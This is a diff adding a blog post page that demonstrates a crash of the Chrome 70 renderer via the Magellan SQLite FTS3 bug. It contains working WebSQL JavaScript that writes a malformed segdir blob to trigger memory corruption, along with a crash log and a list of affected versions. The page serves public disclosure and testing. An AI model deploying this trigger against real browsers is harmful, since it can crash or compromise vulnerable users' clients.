@@ -1,0 +1,136 @@
+<!---
+title: Crash Chrome 70 with the SQLite Magellan bug
+categories: chrome
+permalink: /sqlitebug/
+layout: post
+---!>
+
+<p>This proof-of-concept crashes the Chrome renderer process using <a href="https://blade.tencent.com/magellan/index_en.html">Tencent Blade Team's Magellan SQLite3 bug</a>. It's based on  <a href="https://www.sqlite.org/src/info/940f2adc8541a838">a SQLite test case</a> from the commit that fixed the bug.</p>
+
+<p><span id="prompttext">If you're using Chrome 70 or below, tap the button below to crash this page:</span></p>
+<button onClick="crash()" style="font-size: 150%">Crash this page</button>
+<p>Your browser's user agent is: <span id="browserUserAgent">not available without JavaScript. Turn it on!</span></p>
+
+<p><a href="https://github.com/zhuowei/worthdoingbadly.com/blob/master/_posts/2018-12-14-sqlitebug.html">Source code for this page on GitHub</a>.</p>
+
+<h1>Sign up for more information</h1>
+<p>I'm working on understanding how this issue affects browsers. To get notified when I update this page, please sign up to my mailing list:</p>
+<form action="https://worthdoingbadly.us18.list-manage.com/subscribe/post?u=3f9820ca33ce6a7b1e682c9ac&id=014e6793b7&SIGNUP=inline-sqlitebug" method="post" id="mc-embedded-subscribe-form-inline" name="mc-embedded-subscribe-form-inline" class="validate" target="_blank">
+    <input type="email" value="" name="EMAIL" class="required email" id="mce-EMAIL" placeholder="Email">
+    <div style="position: absolute; left: -5000px;" aria-hidden="true"><input type="text" name="b_3f9820ca33ce6a7b1e682c9ac_014e6793b7" tabindex="-1" value=""></div>
+    <input type="submit" value="Subscribe" name="subscribe" id="mc-embedded-subscribe" class="button">
+</form>
+
+<h1>What's supposed to happen?</h1>
+<p>After you press the button, the page should crash:</p>
+<p><img src="/assets/blog/sqlitebug/sqlite_cropped.png" alt="screenshot"></p>
+<p>On Android 5.1, I get a segfault in memcpy:</p>
+<pre style="font-size: 10px">
+        F/libc    ( 3801): Fatal signal 11 (SIGSEGV), code 1, fault addr 0xe0ddb457 in tid 3854 (Database thread)
+        I/DEBUG   (  142): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
+        I/DEBUG   (  142): Build fingerprint: 'google/nakasi/grouper:5.1/LMY47D/1743759:user/release-keys'
+        I/DEBUG   (  142): Revision: '0'
+        I/DEBUG   (  142): ABI: 'arm'
+        I/DEBUG   (  142): pid: 3801, tid: 3854, name: Database thread  >>> com.android.chrome:sandboxed_process6 <<<
+        I/DEBUG   (  142): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0xe0ddb457
+        I/DEBUG   (  142):     r0 e0ddb457  r1 611be0ab  r2 00000002  r3 ff000000
+        I/DEBUG   (  142):     r4 611be038  r5 00000002  r6 611be0a9  r7 7fffffff
+        I/DEBUG   (  142):     r8 00000001  r9 611be0ab  sl 80000001  fp 00000000
+        I/DEBUG   (  142):     ip 00000066  sp 6defd3a0  lr 00000074  pc 4025eb62  cpsr 680f2430
+        I/DEBUG   (  142): 
+        I/DEBUG   (  142): backtrace:
+        I/DEBUG   (  142):     #00 pc 0000fb62  /system/lib/libc.so (__memcpy_base+217)
+        I/DEBUG   (  142):     #01 pc 018d0e1d  /data/app/com.android.chrome-1/base.apk
+</pre>
+
+<h1>What's affected?</h1>
+<p>Affected: tested, causes one tab/one window to crash:</p>
+<ul>
+    <li>Chrome 70.0.3538.110 on Android 5.1 and 9</li>
+    <li>Electron 2.0.12 on macOS 10.14</li>
+</ul>
+<p>Not affected:</p>
+<ul>
+    <li>Chrome 71.0.3578.98 on Android 8.1 (already fixed)</li>
+    <li>Safari (doesn't have FTS enabled in SQLite3)</li>
+    <li>Browsers not based on Chrome (no WebSQL support)</li>
+</ul>
+
+<script>
+// https://gist.github.com/nolanlawson/0264938033aca2201012
+// https://www.sqlite.org/src/info/940f2adc8541a838
+const db = openDatabase('fts_demo', 1, 'fts_demo', 5000000);
+
+const firstStatements = [
+"DROP TABLE IF EXISTS ft;",
+"CREATE VIRTUAL TABLE ft USING fts3;",
+"INSERT INTO ft VALUES('aback');",
+"INSERT INTO ft VALUES('abaft');",
+"INSERT INTO ft VALUES('abandon');",
+];
+
+const secondStatements = [
+"SELECT quote(root) from ft_segdir;",
+"UPDATE ft_segdir SET root = X'0005616261636B03010200FFFFFFFF070266740302020003046E646F6E03030200';",
+"SELECT * FROM ft WHERE ft MATCH 'abandon';"
+];
+
+function dbSuccess() {
+	console.log("success");
+	console.log(arguments);
+}
+
+function dbErr() {
+	console.log("err");
+	console.log(arguments);
+}
+
+function runAll(statements, success) {
+	db.transaction((tx) => {
+		console.log("alive");
+		for (const statement of statements) {
+			console.log("queueing " + statement);
+			tx.executeSql(statement, [], dbSuccess, dbErr);
+		}
+		console.log("queued");
+	}, dbErr, success);
+}
+function crash() {
+	runAll(firstStatements, (event) => {
+		console.log(event);
+		runAll(secondStatements, (event) => {
+			console.log(event);
+		});
+	});
+}
+// onload
+function getChromeVersion(userAgent) {
+    for (const part of userAgent.split(" ")) {
+        if (part.startsWith("Chrome/") || part.startsWith("Chromium/")) {
+            return part.substring(part.indexOf("/") + 1);
+        }
+    }
+    return null;
+}
+function isChromeSupported(chromeVersion) {
+    if (chromeVersion == null) return false;
+    const firstPart = chromeVersion.substring(0, chromeVersion.indexOf("."));
+    return parseInt(firstPart) <= 70;
+}
+function getPromptText(userAgent) {
+    const chromeVersion = getChromeVersion(userAgent);
+    if (chromeVersion == null) {
+        return "This demo only works on Chrome 70 or below. Open this page in Chrome 70, then tap the button.";
+    }
+    const chromeOK = isChromeSupported(chromeVersion);
+    if (chromeOK) {
+        return "You're using Chrome 70 or below, so you may be vulnerable. Tap the button to crash this page.";
+    }
+    return "Your Chrome is too new. Open this page in Chrome 70, then tap the button.";
+}
+function onLoad() {
+    document.getElementById("browserUserAgent").textContent = navigator.userAgent;
+    document.getElementById("prompttext").textContent = getPromptText(navigator.userAgent);
+}
+window.onload = onLoad;
+</script>
